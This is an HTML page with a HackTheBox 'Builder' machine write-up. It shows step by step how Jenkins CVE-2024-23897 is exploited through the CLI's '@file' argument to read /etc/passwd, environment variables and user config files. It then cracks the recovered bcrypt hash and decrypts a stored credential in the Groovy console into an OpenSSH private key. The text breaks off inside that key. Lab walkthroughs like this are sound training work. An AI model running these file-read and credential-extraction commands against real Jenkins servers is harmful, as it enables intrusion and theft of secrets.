<!doctype html><html lang=en><head><title>'Builder' Machine HTB WriteUp Â· gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="'Builder' HTB Machine WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="'Builder' Machine HTB WriteUp"><meta name=twitter:description content="'Builder' HTB Machine WriteUp"><meta property="og:title" content="'Builder' Machine HTB WriteUp"><meta property="og:description" content="'Builder' HTB Machine WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="http://www.example.com/writeups/builder/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2024-02-15T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-15T00:00:00+00:00"><link rel=canonical href=http://www.example.com/writeups/builder/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/pentesting/images/favicon.svg sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/writeups/>WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pt-br/>ðŸ‡¨ðŸ‡±</a></li></ul></section></nav><div class=content><section class="container page"><article><header><h1 class=title><a class=title-link href=http://www.example.com/writeups/builder/>'Builder' Machine HTB WriteUp</a></h1></header><hr><h1 id=builder-machine----hackthebox>&lsquo;Builder&rsquo; Machine &ndash; HackTheBox
<a class=heading-link href=#builder-machine----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em>
<img src=/images/Builder_avatar.png alt="Builder Avatar"></li></ul><hr><h3 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><ul><li><code>Nmap</code> scan shows 3 ports open: <code>22</code> <code>SSH</code>, and <code>8080</code> identified as <code>HTTP</code> by <code>Nmap</code> scan</li><li>Visiting <code>HTTP</code> website at port <code>8080</code> it looks like a <code>Jenkins</code> site. Recently (as the time of writting, 13/02/2024) a new vulnerability has been detected in <code>Jenkins</code> as can be appreciated in <a href=https://www.jenkins.io/security/advisory/2024-01-24/ class=external-link target=_blank rel=noopener>this report</a>. This new vulnerability is tagged/named as <code>CVE-2024-23897</code></li><li>Based on <a href=CVE-2024-23897>official Jenkins site</a>, we can download a <code>Command Line Interface</code> client from <code>JENKINS_URL/jnlpJars/jenkins-cli.jar</code>. So in our case we download it using <code>wget</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
</span></span></span></code></pre></div><ul><li>To test if this worked I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>  add-job-to-view
</span></span></span><span class=line><span class=cl><span class=go>    Adds jobs to view.
</span></span></span><span class=line><span class=cl><span class=go>  build
</span></span></span><span class=line><span class=cl><span class=go>    Builds a job, and optionally waits until its completion.
</span></span></span><span class=line><span class=cl><span class=go>  cancel-quiet-down
</span></span></span><span class=line><span class=cl><span class=go>    Cancel the effect of the &#34;quiet-down&#34; command.
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>version
</span></span></span><span class=line><span class=cl><span class=go>    Outputs the current version.
</span></span></span><span class=line><span class=cl><span class=go>  wait-node-offline
</span></span></span><span class=line><span class=cl><span class=go>    Wait for a node to become offline.
</span></span></span><span class=line><span class=cl><span class=go>  wait-node-online
</span></span></span><span class=line><span class=cl><span class=go>    Wait for a node to become online.
</span></span></span><span class=line><span class=cl><span class=go>  who-am-i
</span></span></span><span class=line><span class=cl><span class=go>    Reports your credential and permissions.
</span></span></span></code></pre></div><p>with a non-existent command I get</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 randomcommand
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>No such command randomcommand
</span></span></span></code></pre></div><p>but if I run <code>who-am-i</code> (a <code>Jenkins</code> command), I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 who-am-i
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>Authenticated as: anonymous
</span></span></span><span class=line><span class=cl><span class=go>Authorities:
</span></span></span><span class=line><span class=cl><span class=go>  anonymous
</span></span></span></code></pre></div><ul><li>If I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 &#39;@/etc/passwd&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>No such command @/etc/passwd
</span></span></span></code></pre></div><p>but if I add <code>help</code> command to this string I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help &#39;@/etc/passwd&#39;
</span></span></span><span class=line><span class=cl><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span></span><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar help [COMMAND]
</span></span></span><span class=line><span class=cl><span class=go>Lists all the available commands or a detailed description of single command.
</span></span></span><span class=line><span class=cl><span class=go> COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
</span></span></span></code></pre></div><p>so we have reached a <code>Local File Inclusion</code></p><ul><li>To see where is <code>Jenkins</code> running I check <code>/proc/self/environ</code> and obtain:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help &#39;@/proc/self/environ&#39; 2&gt;&amp;1 | tail
</span></span></span><span class=line><span class=cl><span class=go>  version
</span></span></span><span class=line><span class=cl><span class=go>    Outputs the current version.
</span></span></span><span class=line><span class=cl><span class=go>  wait-node-offline
</span></span></span><span class=line><span class=cl><span class=go>    Wait for a node to become offline.
</span></span></span><span class=line><span class=cl><span class=go>  wait-node-online
</span></span></span><span class=line><span class=cl><span class=go>    Wait for a node to become online.
</span></span></span><span class=line><span class=cl><span class=go>  who-am-i
</span></span></span><span class=line><span class=cl><span class=go>    Reports your credential and permissions.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ERROR: No such command HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin. Available commands are above.
</span></span></span></code></pre></div><p>or to see it better I use <code>grep</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help &#39;@/proc/self/environ&#39; 2&gt;&amp;1 | grep -a -A999 &#34;ERROR&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ERROR: No such command HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin. Available commands are above.
</span></span></span></code></pre></div><ul><li>From this output I can see that the server is located at <code>/var/jenkins_home</code>. Usually users are stored at <code>/var/jenkins_home/users/users.xml</code>. However, using <code>help</code> command did not give anything.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help &#39;@/var/jenkins_home/users/users.xml&#39; 2&gt;&amp;1 | grep -a -A999 &#34;ERROR&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ERROR: Too many arguments: &lt;hudson.model.UserIdMapper&gt;
</span></span></span><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar help [COMMAND]
</span></span></span><span class=line><span class=cl><span class=go>Lists all the available commands or a detailed description of single command.
</span></span></span><span class=line><span class=cl><span class=go> COMMAND : Name of the command (default: &lt;?xml version=&#39;1.1&#39; encoding=&#39;UTF-8&#39;?&gt;)
</span></span></span></code></pre></div><ul><li>After using many other commands I use <code>connect-node</code> and get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node &#39;@/var/jenkins_home/users/users.xml&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>&lt;?xml version=&#39;1.1&#39; encoding=&#39;UTF-8&#39;?&gt;: No such agent &#34;&lt;?xml version=&#39;1.1&#39; encoding=&#39;UTF-8&#39;?&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;: No such agent &#34;      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>  &lt;idToDirectoryNameMap class=&#34;concurrent-hash-map&#34;&gt;: No such agent &#34;  &lt;idToDirectoryNameMap class=&#34;concurrent-hash-map&#34;&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>    &lt;entry&gt;: No such agent &#34;    &lt;entry&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>      &lt;string&gt;jennifer&lt;/string&gt;: No such agent &#34;      &lt;string&gt;jennifer&lt;/string&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>  &lt;version&gt;1&lt;/version&gt;: No such agent &#34;  &lt;version&gt;1&lt;/version&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>&lt;/hudson.model.UserIdMapper&gt;: No such agent &#34;&lt;/hudson.model.UserIdMapper&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>  &lt;/idToDirectoryNameMap&gt;: No such agent &#34;  &lt;/idToDirectoryNameMap&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>&lt;hudson.model.UserIdMapper&gt;: No such agent &#34;&lt;hudson.model.UserIdMapper&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>    &lt;/entry&gt;: No such agent &#34;    &lt;/entry&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ERROR: Error occurred while performing this command, see previous stderr output.
</span></span></span></code></pre></div><p>and I can see a directory <code>jennifer_12108429903186576833</code>. This means that the directory <code>/var/jenkins_home/users/jennifer_12108429903186576833</code> should exist. And inside it there should be a <code>config.xml</code> file.</p><ul><li>We then try to read <code>/var/jenkins_home/users/jennifer_12108429903186576833/config.xml</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node &#39;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>    &lt;hudson.tasks.Mailer_-UserProperty plugin=&#34;mailer@463.vedf8358e006b_&#34;&gt;: No such agent &#34;    &lt;hudson.tasks.Mailer_-UserProperty plugin=&#34;mailer@463.vedf8358e006b_&#34;&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>    &lt;hudson.search.UserSearchProperty&gt;: No such agent &#34;    &lt;hudson.search.UserSearchProperty&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>      &lt;roles&gt;: No such agent &#34;      &lt;roles&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>    &lt;jenkins.security.seed.UserSeedProperty&gt;: No such agent &#34;    &lt;jenkins.security.seed.UserSeedProperty&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>      &lt;/tokenStore&gt;: No such agent &#34;      &lt;/tokenStore&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=&#34;theme-manager@215.vc1ff18d67920&#34;/&gt;: No such agent &#34;    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=&#34;theme-manager@215.vc1ff18d67920&#34;/&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go>      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;: No such agent &#34;      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;&#34; exists.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ERROR: Error occurred while performing this command, see previous stderr output.
</span></span></span></code></pre></div><p>and I can see a hash: <code>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code></p><ul><li>I try to crack this password using <code>JohnTheRipper|john</code> and obtain something:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john --wordlist=/usr/share/wordlists/rockyou.txt jennifer_hash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>princess         (?)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:00 DONE (2024-02-13 18:33) 3.571g/s 160.7p/s 160.7c/s 160.7C/s 123456..jennifer
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>so, apparently, we have found the credentials <code>jennifer:princess</code></p><ul><li>I tried to log in via <code>SSH</code> with these credentials but did not work.</li><li>These credentials work within the <code>Jenkins</code> site. I try to get a reverse shell and it does. But I encounter two problems: 1) The site is within a <code>Docker</code> container; 2) The reverse shell is not very responsive. So I go back to the site and look for other things</li><li>In <code>Dashboard > Manage Jenkins > Credentials</code> I can see something:
<img src=/images/Builder_1.png alt="Builder 1">
so we have a <code>Credentials</code> section. I click on <code>System > Global credentials (unrestricted) > Click on Wrench Icon (EDIT)</code>.</li><li>Then, in this page, I scroll down and I can see a <code>Concealed for Confidentiality</code> key that I am not able to see. However, in <code>Firefox</code> if we right click on the page and <code>Inspect > Inspector</code> and go to the place where this text appear we can see the key:
<img src=/images/Builder_2.png alt="Builder 2">
and I save this into a file.</li><li>I try to decrypt it but nothing works. However, the available <code>Groovy</code> console (located at <code>/script</code> directory) has a function to decrypt the key:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-groovy data-lang=groovy><span class=line><span class=cl><span class=n>println</span><span class=o>(</span><span class=n>hudson</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>Secret</span><span class=o>.</span><span class=na>decrypt</span><span class=o>(</span><span class=s2>&#34;&lt;value-key&gt;&#34;</span><span class=o>))</span>
</span></span></code></pre></div><p>where <code>&lt;value-key></code> is the key obtained from the website (including <code>{</code> and <code>}</code> characters)
So I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-groovy data-lang=groovy><span class=line><span class=cl><span class=n>println</span><span class=o>(</span><span class=n>hudson</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>Secret</span><span class=o>.</span><span class=na>decrypt</span><span class=o>(</span><span class=s2>&#34;{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}&#34;</span><span class=o>))</span>
</span></span></code></pre></div><p>and get the server response:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span></span><span class=line><span class=cl><span class=go>NhAAAAAwEAAQAAAYEAt3G9oUyouXj/0CLya9Wz7Vs31bC4rdvgv7n9PCwrApm8PmGCSLgv
</span></span></span><span class=line><span class=cl><span class=go>Up2m70MKGF5e+s1KZZw7gQbVHRI0U+2t/u8A5dJJsU9DVf9w54N08IjvPK/cgFEYcyRXWA
</span></span></span><span class=line><span class=cl><span class=go>EYz0+41fcDjGyzO9dlNlJ/w2NRP2xFg4+vYxX+tpq6G5Fnhhd5mCwUyAu7VKw4cVS36CNx
</span></span></span><span class=line><span class=cl><span class=go>vqAC/KwFA8y0/s24T1U/sTj2xTaO3wlIrdQGPhfY0wsuYIVV3gHGPyY8bZ2HDdES5vDRpo
</span></span></span><span class=line><span class=cl><span class=go>Fzwi85aNunCzvSQrnzpdrelqgFJc3UPV8s4yaL9JO3+s+akLr5YvPhIWMAmTbfeT3BwgMD
</span></span></span><span class=line><span class=cl><span class=go>vUzyyF8wzh9Ee1J/6WyZbJzlP/Cdux9ilD88piwR2PulQXfPj6omT059uHGB4Lbp0AxRXo
</span></span></span><span class=line><span class=cl><span class=go>L0gkxGXkcXYgVYgQlTNZsK8DhuAr0zaALkFo2vDPcCC1sc+FYTO1g2SOP4shZEkxMR1To5
</span></span></span><span class=line><span class=cl><span class=go>yj/fRqtKvoMxdEokIVeQesj1YGvQqGCXNIchhfRNAAAFiNdpesPXaXrDAAAAB3NzaC1yc2
